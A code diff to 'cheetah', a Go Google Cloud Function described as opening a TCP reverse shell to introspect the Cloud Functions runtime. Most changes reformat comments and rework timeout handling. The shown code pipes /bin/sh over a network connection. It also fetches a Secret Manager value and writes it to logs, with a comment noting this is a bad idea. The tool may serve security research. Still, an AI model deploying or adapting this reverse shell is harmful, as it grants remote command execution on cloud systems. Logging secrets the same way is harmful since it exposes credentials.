@@ -1,5 +1,6 @@
 /*
-Package cheetah is a Go function that can be deployed to the Google Cloud Platform to establish a TCP reverse shell for the purposes of introspecting the Cloud Functions container runtime.
+Package cheetah is a Go function that can be deployed to the Google Cloud Platform to establish a TCP reverse shell for
+the purposes of introspecting the Cloud Functions container runtime.
 
 References:
 https://github.com/sathish09/rev2go
@@ -36,10 +37,10 @@ func respondWithError(w http.ResponseWriter, errMsg string, statusCode int) {
 
 // Cheetah establishes a TCP reverse shell connection.
 func Cheetah(w http.ResponseWriter, r *http.Request) {
-	//Audit logging
+	// Audit logging
 	writeLog(1, "Startup: The Cheetah is running.")
 
-	//Grab the function timeout
+	// Grab the function timeout
 	timeout, err := strconv.ParseUint(os.Getenv("X_GOOGLE_FUNCTION_TIMEOUT_SEC"), 10, 64)
 
 	if err != nil {
@@ -48,17 +49,11 @@ func Cheetah(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	//Read basic secret to produce normal audit log activity
+	// Read basic secret to produce normal audit log activity
 	secret := getSecret("cheetah-database-pass")
-	//NOTE: DON'T DO THIS IN REAL LIFE. BAD IDEA TO LOG SECRETS
-	//DEBUG ONLY: Make sure it found the value
+	// NOTE: DON'T DO THIS IN REAL LIFE. BAD IDEA TO LOG SECRETS
+	// DEBUG ONLY: Make sure it found the value
 	writeLog(8, fmt.Sprintf("Secret value: %s", secret))
-
-	// For some reason, a timeout doesn't send a response. Force a response by exiting the process.
-	time.AfterFunc(time.Duration(timeout)*time.Second, func() {
-		writeLog(3, "Timeout: Function timeout occurred.")
-		os.Exit(0)
-	})
 
 	type Response struct {
 		Error string
@@ -91,17 +86,29 @@ func Cheetah(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	timedOut := false
+
+	// Close the connection 1 second before the function times out.
+	time.AfterFunc((time.Duration(timeout-1)*time.Second), func() {
+		timedOut = true
+		conn.Close()
+	})
+
 	cmd := exec.Command("/bin/sh")
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
 	cmd.Run()
 
-	respondWithError(w, "Connection terminated from client.", 500)
-	conn.Close()
+	if (timedOut == true) {
+		respondWithError(w, "Timeout: Function timeout occurred.", 500)
+	} else {
+		respondWithError(w, "Connection terminated from client.", 500)
+		conn.Close()
+	}
 
 	writeLog(5, "Shutdown: The Cheetah is tired.")
 }
 
-//Stackdriver logging util
+// Stackdriver logging util
 func writeLog(id int, message string) {
 	ctx := context.Background()
 
@@ -159,6 +166,6 @@ func getSecret(name string) (value string) {
 		return ""
 	}
 
-	//Return the value
+	// Return the value
 	return string(result.Payload.Data)
 }
